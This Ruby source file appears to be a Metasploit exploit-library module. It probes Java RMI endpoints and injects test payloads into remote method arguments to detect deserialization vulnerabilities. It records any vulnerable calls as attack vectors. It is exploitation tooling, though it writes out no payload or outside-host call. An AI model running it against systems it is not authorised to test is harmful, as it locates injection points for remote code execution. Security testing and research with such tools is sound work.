# -*- coding: binary -*-

module Msf
  module Exploit::Java::Serialized::RMI

    class ReferenceProber
      def initialize(name, ref, reg, connhost, rc)
        @name = name
        @reg = reg
        @ref = ref
        @host = ref['host']
        @port = ref['port']
        @objid = ref['objid']
        @uid = ref['uid']
        @ssl = false
        @legacy = false
        @rc = rc

        if !ref['factory'].nil? && ref['factory'][0][0] == 'javax.rmi.ssl.SslRMIClientSocketFactory'
          Util.info 'Exported on a SSL endpoint'
          @ssl = true
        end

        begin
          client = Rex::Java::JRMP::JRMPClient.new(@host, @port, @reg, ssl: @ssl)
          r = client.call(@objid, 0, 0, [], uid: @uid)
          Util.info 'Is a legacy-style object ' + name
          @legacy = true
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]

          if root[1]['detailMessage'] == 'skeleton class not found but required for client version'
            Util.info 'Is a new-style object ' + name
          elsif type == 'java.rmi.server.SkeletonMismatchException'
            Util.info 'Is a custom object ' + name
          else
            raise
          end
        rescue ::Exception => e
          if @host != connhost
            @host = connhost
            Util.info 'Trying with original host ' + @host + ' port ' + @port.to_s
            client = Rex::Java::JRMP::JRMPClient.new(@host, @port, @reg, ssl: @ssl)
            begin
              r = client.call(@objid, 0, 0, [], uid: @uid)
            rescue Rex::Java::JRMP::JRMPError => e
            rescue ::Exception => e
              Util.error 'Failed to connect: ' + e.to_s
              raise
            end
            end
        end
      end

      def run
        vectors = []
        if !@rc.method_hash.nil?
          methodhash = @rc.method_hash
          methodid = @rc.method_id
          Util.info 'Method/interface hash ' + methodhash.to_s + ' method id ' + methodid.to_s
          # TODO: support custom argument list?
          args = [nil]
          argidx = 0
        elsif !@rc.method_signature.nil?
          methodid = -1
          methodhash = Rex::Java::JRMP::Util.generate_method_hash(@rc.method_signature)
          args, argidx = Rex::Java::JRMP::Util.make_dummy_args(@rc.method_signature)
          if argidx < 0
            Util.error 'Method without a object-valued parameter'
            return vectors
          end
          Util.info 'Computed method hash ' + methodhash.to_s + ' for ' + @rc.method_signature
          Util.info 'Injecting argument ' + argidx.to_s
        else
          Util.error 'Further testing requires method details...'
          return vectors
        end

        begin
          send(methodid, methodhash, args)
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.rmi.UnmarshalException'
            Util.error root[1]['detailMessage']
            return vectors
          elsif type == 'java.lang.NullPointerException'
          elsif type == 'java.rmi.RemoteException'
          else
            raise
          end
        end

        return vectors unless @rc.try_deser?
        ctx = Rex::Java::Serialization::Probe::BuiltinProbes.new.create_context(@reg,
                                                                                params: {
          'methodid' => methodid,
          'methodhash' => methodhash,
          'args' => args,
          'argidx' => argidx
        })

        strategy = Rex::Java::Serialization::Probe::ExceptionProbeStrategy.new(method(:test_call))
        strategy.init(ctx)

        if ctx.run(strategy)
          vectors.push(RMICallDeserVector.new(@host,
                                              @port,
                                              @objid,
                                              ssl: @ssl,
                                              ctx: ctx,
                                              uid: @uid,
                                              methodId: methodid,
                                              methodHash: methodhash,
                                              baseargs: args,
                                              argidx: argidx))
        end

        vectors
      end

      def send(methodid, methodhash, args, location: nil, customreg: nil)
        reg = @reg
        reg = customreg unless customreg.nil?
        client = Rex::Java::JRMP::JRMPClient.new(@host, @port, reg, location: location, ssl: @ssl)
        client.call(@objid, methodid, methodhash, args, uid: @uid)
      end

      def test_call(payl, reg, params)
        args = params['args']
        args[params['argidx']] = payl
        begin
          send(params['methodid'], params['methodhash'], args, customreg: reg)
        rescue Rex::Java::JRMP::JRMPError => e
          root = Rex::Java::JRMP::Util.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.lang.IllegalArgumentException'
            return
          else
            return type
          end
        end
      end

      def close; end
    end
  end
end
